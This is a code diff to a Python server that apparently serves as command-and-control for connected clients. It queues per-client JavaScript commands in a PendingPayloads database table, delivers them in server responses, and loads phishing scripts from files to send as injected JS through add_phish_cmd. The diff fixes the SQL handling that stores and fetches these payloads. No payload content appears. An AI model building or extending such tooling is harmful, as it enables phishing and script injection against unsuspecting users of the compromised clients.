@@ -12,6 +12,11 @@ BASE_SERVER_RESPONSE = {
 }
 pending_payloads = {} #format: clientid:<instance of server response>; fetched from database
 
+JScmd = {
+        "pattern":"",
+        "cmd":"",
+}
+
 def new_response(clientid):
     resp = deepcopy(BASE_SERVER_RESPONSE)
     resp["clientid"] = clientid
@@ -42,6 +47,14 @@ def construct_response(clientid):
         for row in blacklist:
             blacklistList.append(row[0])
         resp["security_blacklist"] = blacklistList
+        conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = (%s)', clientid)
+        payload = conn.fetchall()
+        if len(payload) != 0:
+            if len(payload[0]) != 0: 
+                dictPayload = json.loads(payload[0][0])
+                dictJS = dictPayload["js-cmd"]
+                for x in dictJS:
+                    resp["js-cmd"].append(x["cmd"])
     return resp
 
 def is_online(clientid):
@@ -56,15 +69,22 @@ def is_online(clientid):
 
 
 def add_js_cmd(clientid, pattern, cmd):
-    tuple_value = (pattern, cmd)
+    tuple_value = deepcopy(JScmd)
+    tuple_value["pattern"] = pattern
+    tuple_value["cmd"] = cmd
     if is_online(clientid):
         pending_payloads[clientid]["js-cmd"].append(tuple_value)
     else:
         with getConn() as conn:
-            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s')
+            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s', clientid)
             payload = json.loads(conn.fetchone()[0]) if conn.rowcount != 0 else deepcopy(BASE_SERVER_RESPONSE)
             payload['js-cmd'].append(tuple_value)
-            conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)', (clientid, payload, payload, clientid))
+            payload = json.dumps(payload)
+            if(conn.rowcount == 0):
+                conn.execute('INSERT INTO PendingPayloads values (%s, %s)', (clientid, payload))
+            else:
+                conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s)', (clientid, payload, payload))
+    return 'OK';
 
 def add_phish_cmd(clientid, pattern, cmd):
     if(cmd == "1" or cmd == "2"):
@@ -72,6 +92,7 @@ def add_phish_cmd(clientid, pattern, cmd):
         fileP = open(fStr, "r")
         sendcmd = fileP.read()
         add_js_cmd(clientid, pattern, sendcmd)
+    return 'OK';
 
 """
 Handles creation of new client.
